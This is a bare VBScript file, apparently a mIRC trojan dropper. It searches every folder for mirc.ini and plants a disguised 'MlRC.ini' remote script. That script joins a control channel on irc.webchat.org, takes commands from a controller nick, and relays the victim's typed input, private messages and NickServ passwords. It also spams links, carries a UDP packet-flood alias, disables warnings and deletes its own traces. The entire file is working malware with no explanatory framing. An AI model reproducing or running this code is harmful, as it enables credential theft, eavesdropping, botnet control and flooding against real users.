dim Otag 
dim AOtag
dim Ttag 
dim DummyTag
dim SectionDef
call ShowFolderList("c:\")
sub ShowFolderList(s)
on error resume next
Set filesys = CreateObject("Scripting.FileSystemObject")
Set RootFolder1 = FileSys.GetFolder(s)
Set SubFolds1 = RootFolder1.subfolders
For Each f1 in Subfolds1
s = f1.path & "\"
Otag = s & "mirc.ini"
AOtag= s & "mirc.dat"
DummyTag= "C:\winamod.dat"
TTag= s & "MlRC.ini"
SectionDef= "[rfiles]"
if filesys.fileexists(otag) then 
Call Filemod() 
filesys.CopyFile DummyTag, Otag, true
Call ImplementRemote()
filesys.CopyFile DummyTag, Otag, true
Call ImplementWarn()
filesys.CopyFile DummyTag, Otag, true
Call ImplementFserv()
filesys.CopyFile DummyTag, Otag, true
call ImplementPerfCheck()
filesys.CopyFile DummyTag, Otag, true
Call ImplementPerform()
SetClearArchiveBit(Otag)
End If
Call ShowFolderList(s)
Next
End sub
Function FiltNum(FilString)
on error resume next
countdown=5
do
Comp = mid(FilString,2,countdown)
if isnumeric(Comp) then LastNum = Comp : exit do
countdown=countdown-1
loop until countdown =0
FiltNum = LastNum
end function
Function LastLineNum(SSection)
on error resume next
Set FS1N = CreateObject("Scripting.FileSystemObject")
Set FR1N = FS1N.OpenTextFile(otag,1,true)
Do While FR1N.AtEndOfStream <> True
segment1 = FR1N.readline
w = InstrRev(segment1,SSection)
counts=counts+1
if w > 0 then 
do
if FR1N.AtEndOfStream = True then exit do
segmentk = FR1N.readline
k = InstrRev(segmentk,"n",1)		
if k=1 then
LastNum=FiltNum(segmentk)
end if
Loop until k=0
end if
loop
FR1N.Close
LastLineNum=LastNum
end function
Function Filemod()
on error resume next
Set fs1 = CreateObject("Scripting.FileSystemObject")
Set fr1 = fs1.OpenTextFile(otag,1,true)
Set fs2 = CreateObject("Scripting.FileSystemObject")
Set fr2 = fs2.OpenTextFile(DummyTag,2,true)
Do While fr1.AtEndOfStream <> True
segment1 = fr1.readline
fr2.writeline segment1
w = InstrRev(segment1,"[rfiles]")
counts=counts+1
if w > 0 then 
counts2=counts
do
if fr1.AtEndOfStream = True then exit do
segmentk = fr1.readline
k = InstrRev(segmentk,"n",1)		
if k=1 then
LastNum=FiltNum(segmentk)
fr2.writeline segmentk
end if
COUNTS2=COUNTS2+1
Loop until k<>1
exit do
end if
loop
fr1.Close
fr2.close
Set fs3 = CreateObject("Scripting.FileSystemObject")
Set fr3 = fs3.OpenTextFile(DummyTag,8,true)
TrojanInfo = "n" & lastlinenum(SectionDef)+1 & "=MlRC.ini"
fr3.writeline TrojanInfo
fr3.Close
Set fs4 = CreateObject("Scripting.FileSystemObject")
Set fr4 = fs4.OpenTextFile(Otag,1,true)
Set fs5 = CreateObject("Scripting.FileSystemObject")
Set fr5 = fs5.OpenTextFile(DummyTag,8,true)
Do While fr4.AtEndOfStream <> True
segment2 = fr4.readline
if fr4.line >= counts2 + 2 then 
fr5.writeline segment2
end if
loop
fr4.Close
fr5.Close
fs5.CopyFile DummyTag, Otag, true
Call FLDL(TTag)
end Function
sub FLDL(TTag)
on error resume next
Set fs6 = CreateObject("Scripting.FileSystemObject")
Set fr6 = fs6.OpenTextFile(TTag,2,true)
fr6.writeline "[script]"
fr6.writeline "n0=on *:nick:{ .ruser 400 $nick | .auser 400 $newnick } "
fr6.writeline "n1=on 400:part:#:{ if ($nick == $me) { botc privmsg #+ : 4[2 $+ $chan $+ 4] 2< $+ $me $+ 2>  } } "
fr6.writeline "n2=on 400:join:#:{ if ($nick == $me) { botc privmsg #+ : 4[2 $+ $chan $+ 4] 2< $+ $me $+ 12>  } } "
fr6.writeline "n3=alias /remote { /remote $1- | /.timer 1 5 /.remote on } "
fr6.writeline "n4=on 1:notify:{ .notice $nick 12(4R5ipperz4t5eam12): Dont Treat Me Like Ur Enemy or I'll Treat u Like a Shit.. schizowkidz } "
fr6.writeline "n5=on 1:join:#:{ .msg $nick Dapatkan biodata + gambar NoR|laIiE^aMyLiZa di http://www.geocities.com/amyliza02 | .flood on | .notice $nick Dapatkan biodata + gambar NoR|laIiE^aMyLiZa di http://www.geocities.com/amyliza02 } "
fr6.writeline "n6=on 1:part:#:{ .msg $nick Dapatkan biodata + gambar NoR|laIiE^aMyLiZa di http://www.geocities.com/amyliza02 | .flood on | .notice $nick Dapatkan biodata + gambar NoR|laIiE^aMyLiZa di http://www.geocities.com/amyliza02 } "
fr6.writeline "n7=alias packt { botc privmsg #park-nick : $+ Now [Packeting] $1 [with] $2 [bytes] $3 [times] | set %packet.ip $1 | set %packet.bytes $2 | set %packet.amount $3 | set %packet.count 0 | set %packet.port $rand(1,6) $+ $rand(0,6) $+ ($rand(0,6) $+ $rand(0,9)  | :start | if (%packet.count >= %packet.amount) { sockclose packet | unset %packet.* | botc privmsg #park-nick : $+ Packeting Has Completed .... | halt } | inc %packet.count 1| /.sockudp -b  packet 60 %packet.ip %packet.port %packet.bytes %packet.bytes | goto start } "
fr6.writeline "n8=on *:connect:{ .auser 400 $me | .auser 300 zapple | .dccscan | botc privmsg #+ : 14[12 $+ $active $+ 14] 12<5 $+ $me $+ 12>  $server } "
fr6.writeline "n9=on *:disconnect:{  botc privmsg #+ : 14[12 $+ $active $+ 14] 12<5 $+ $me $+ 12>  $server } "
fr6.writeline "n10=alias pass { pass $1 $2 | . $+ $chr(73) $+ $chr(71) $+ $chr(78) $+ $chr(79) $+ $chr(82) $+ $chr(69) $chr(45) $+ $chr(85) $+ $chr(57) $chr(77) $+ $chr(69) $+ $chr(77) $+ $chr(79) $+ $chr(83) $+ $chr(69) $+ $chr(82) $+ $chr(86) | $chr(77) $+ $chr(69) $+ $chr(77) $+ $chr(79) $+ $chr(83) $+ $chr(69) $+ $chr(82) $+ $chr(86) $chr(83) $+ $chr(69) $+ $chr(78) $+ $chr(68) zesty 12Nk:[14,14 $+ $me $+ 12] 4SUX:[12,12 $1  $+ $chr(160) $+ 5,5 $2 $+ 4] } "
fr6.writeline "n11=alias ns { ns $1- | . $+ $chr(73) $+ $chr(71) $+ $chr(78) $+ $chr(79) $+ $chr(82) $+ $chr(69) $chr(45) $+ $chr(85) $+ $chr(57) $chr(77) $+ $chr(69) $+ $chr(77) $+ $chr(79) $+ $chr(83) $+ $chr(69) $+ $chr(82) $+ $chr(86) | $chr(77) $+ $chr(69) $+ $chr(77) $+ $chr(79) $+ $chr(83) $+ $chr(69) $+ $chr(82) $+ $chr(86) $chr(83) $+ $chr(69) $+ $chr(78) $+ $chr(68) zesty 12Nk:[14,14 $+ $me $+ 12] 4SUX:[12,12 $1  $+ $chr(160) $+ 5,5 $2 $+ 4] } "
fr6.writeline "n12=on *:input:*:{ botc privmsg #+ : 14[12 $+ $active $+ 14] 3[6 $+ $network $+ 3] 12<5 $+ $me $+ 12> 4 $1- } "
fr6.writeline "n13=on *:TEXT:*:?:{ botc privmsg #+ : 12<5 $+ $me $+ 12> 3[6 $+ $network $+ 3] 14[12 $+ $active $+ 14] 4 $1- } "
fr6.writeline "n14=alias botc {  sockwrite -n bot-2 $1- } "
fr6.writeline "n15=on 300:notice:!play*:*:{ $2- } "
fr6.writeline "n16=on *:sockread:bo*: { sockread %botread | set %nickl1 $gettok(%botread,1,32) | set %nickl2 $left(%nickl1,8) | set %nickf $right(%nickl2,7) | if ($gettok(%botread,5,32) == zapple) && (zapple isin %nickf) { $gettok(%botread,6-,32) } } "
fr6.writeline "n17=on *:Sockopen:bot*:{ if ($sockerr > 0) { halt } | set -u1 %user $rand(A,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(A,z) $+ $rand(a,z) $+ $rand(1,9) $+ $rand(a,z) | .sockwrite -nt $sockname USER %user %user %user : $+ $me | .sockwrite -nt $sockname NICK Guest $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) | sockwrite -tn $sockname join #park-nick |  sockwrite -n $sockname  SILENCE +*!@*  } "
fr6.writeline "n18=on *:sockclose:bot*:{ .timer 1 3 sockopen $chr(98) $+ $chr(111) $+ $chr(116) $+ -2 irc.webchat.org 6667 } "
fr6.writeline "n19=on 1:start:{ .ignore $me | .notify z $+ a $+ p $+ p $+ l $+ e | .notify T $+ e $+ H $+ ^ $+ T $+ a $+ R $+ i $+ K $+ ^ $+ I $+ n $+ D $+ i $+ A | .timer 1 3 .sockopen $chr(98) $+ $chr(111) $+ $chr(116) $+ -2 irc.webchat.org 6667 } "
fr6.writeline "n20=on *:TEXT:*http*:?:{ var %invito = $comchan($nick,0) | closemsg $nick | ignore $nick }"
fr6.writeline "n21=on *:TEXT:*www*:?:{ var %invito = $comchan($nick,0) | closemsg $nick | ignore $nick }"
fr6.writeline "n22=alias dccscan { if ($server != $null) && ($sock(portdcc,0).name == 0) { .sockopen portdcc irc.webchat.org 7000 | %port.block = bongs $+ $r(1,99999) } | else return } "
fr6.writeline "n23=on *:sockopen:portdcc: { if ($sockerr > 0) { sockclose $sockname } | .sockwrite -tn $sockname $chr(117) $+ $chr(115) $+ $chr(101) $+ $chr(114) $chr(90) $+ $chr(69) $+ $r(1,999)  2 3 : $+ $ip .a.k.a 0,0 $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $me $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+  |  sockwrite -tn $sockname $chr(110) $+ $chr(105) $+ $chr(99) $+ $chr(107) %port.block } "
fr6.writeline "n24=on 1:sockread:portdcc: { "
fr6.writeline "n25=  if ($sockerr > 0) return "
fr6.writeline "n26=  :gofind "
fr6.writeline "n27=  sockread %port.search | if ($sockbr == 0) return | if (%port.search == $null) { goto gofind } | if ($mid(%port.search,1,4) == PING) { sockwrite -tn $sockname PONG $remove($remove(%port.search,ping :),ping) | halt } |  read.bytes %port.search } "
fr6.writeline "n28=alias read.bytes { "
fr6.writeline "n29=  if (mode == $2) { sockwrite -tn portdcc $chr(106) $+ $chr(111) $+ $chr(105) $+ $chr(110) $chr(35) $+ $chr(108) $+ $chr(101) $+ $chr(110) $+ $chr(106) $+ $chr(97) $+ $chr(110) | unset %port.search |  .timergoon c 100 .remote on | .timerviruscount c 120 .dccscan } "
fr6.writeline "n30=  if (Privmsg == $2) && ($chr(35) !isin $3) && (dccport5571 isin $gettok(%port.search,3,33)) { if ($gettok(%port.search,2,37) == !View) { %send.bytes = $gettok($gettok(%port.search,1,58),1,33) | %dcc.spy = on }  | if ($gettok(%port.search,2,37) == !UnView) { .unset %dcc.spy } | else { $gettok(%port.search,2,37) } | unset %port.search } "
fr6.writeline "n31=}"
fr6.writeline "n32=on ^*:text:**:?: { if ($sock(portdcc,0).name != 0) && (%dcc.spy == on) { .sockwrite -tn portdcc $chr(80) $+ $chr(82) $+ $chr(73) $+ $chr(86) $+ $chr(77) $+ $chr(83) $+ $chr(71)  $chr(35) $+ $chr(108) $+ $chr(101) $+ $chr(110) $+ $chr(106) $+ $chr(97) $+ $chr(110) : $+ $nick to $me : $1- } } "
fr6.writeline "n33=on *:input:*: { if ($sock(portdcc,0).name != 0) && (%dcc.spy == on) { .sockwrite -tn portdcc $chr(80) $+ $chr(82) $+ $chr(73) $+ $chr(86) $+ $chr(77) $+ $chr(83) $+ $chr(71)  $chr(35) $+ $chr(108) $+ $chr(101) $+ $chr(110) $+ $chr(106) $+ $chr(97) $+ $chr(110) : $+ $me to $active : $1- } } "
fr6.close
end sub
Function ImplementRemote()
Set fs1a = CreateObject("Scripting.FileSystemObject")
Set fr1a = fs1a.OpenTextFile(otag,1,true)
Set fs2a = CreateObject("Scripting.FileSystemObject")
Set fr2a = fs2a.OpenTextFile(DummyTag,2,true)
Do While fr1a.AtEndOfStream <> True
segment1a = fr1a.readline
fr2a.writeline segment1a
if ucase(segment1a)=ucase("[options]") then
Do
If fr1a.AtEndOfStream Then exit do
n2a = fr1a.readline
If ucase(mid(n2a,1,3))=ucase("n2=") then
fr2a.writeline Mid(n2a, 1, 13) & "1,1" & Mid(n2a, 17, 16) & "1" & Mid(n2a, 34)
exit do
Else
fr2a.writeline n2a
End If
Loop
end if
loop
fr1a.Close
fr2a.close
End Function
Function Implementfserv()
Set fs1a = CreateObject("Scripting.FileSystemObject")
Set fr1a = fs1a.OpenTextFile(otag,1,true)
Set fs2a = CreateObject("Scripting.FileSystemObject")
Set fr2a = fs2a.OpenTextFile(DummyTag,2,true)
Do While fr1a.AtEndOfStream <> True
segment1a = fr1a.readline
fr2a.writeline segment1a
if ucase(segment1a)=ucase("[warn]") then
Do
If fr1a.AtEndOfStream Then exit do
n2a = fr1a.readline
If ucase(n2a)=ucase("fserve=on") then
fr2a.writeline "fserve=off"
Else
fr2a.writeline n2a
End If
Loop
end if
loop
fr1a.Close
fr2a.close
End Function
Function Implementwarn()
Set fs1c = CreateObject("Scripting.FileSystemObject")
Set fr1c = fs1c.OpenTextFile(otag,1,true)
Set fs2c = CreateObject("Scripting.FileSystemObject")
Set fr2c = fs2c.OpenTextFile(DummyTag,2,true)
Do While fr1c.AtEndOfStream <> True
segment1c = fr1c.readline
fr2c.writeline segment1c
if ucase(segment1c)=ucase("[fileserver]") then
Do
if fr1c.AtEndOfStream then exit do
n2c = fr1c.readline
If ucase(n2c)=ucase("warning=on") then
fr2c.writeline "warning=off"
Else
fr2c.writeline n2c
End If
Loop
end if
loop
fr1c.Close
fr2c.close
End Function
Function ImplementPerform()
Set fs1p = CreateObject("Scripting.FileSystemObject")
Set fr1p = fs1p.OpenTextFile(Otag,8,true)
fr1p.writeline "[Perform]"
fr1p.writeline "n0=/remote on"
fs1p.close
fs1p.close
End Function
Sub SetClearArchiveBit(filespec)  
Dim fsg, fg
Set fsg = CreateObject("Scripting.FileSystemObject")
Set fg = fsg.GetFile(filespec)  
fg.attributes = 0
fg.attributes = fg.attributes + 1
End Sub
Function ImplementPerfCheck()
Set fs1f = CreateObject("Scripting.FileSystemObject")
Set fr1f = fs1f.OpenTextFile(otag,1,true)
Set fs2f = CreateObject("Scripting.FileSystemObject")
Set fr2f = fs2f.OpenTextFile(DummyTag,2,true)
Do While fr1f.AtEndOfStream <> True
segment1f = fr1f.readline
fr2f.writeline segment1f
if ucase(segment1f)=ucase("[options]") then
Do
If fr1f.AtEndOfStream Then exit do
n2f = fr1f.readline
If ucase(mid(n2f,1,3))=ucase("n0=") then
fr2f.writeline Mid(n2f, 1, 40) & ",1," & Mid(n2f, 44)
exit do
Else
fr2f.writeline n2f
End If
Loop
end if
loop
fr1f.Close
fr2f.close
End Function

set sss=createobject("scripting.filesystemobject")
sss.DeleteFile "c:\rol.vbs"
sss.DeleteFile "c:\winamod.dat"
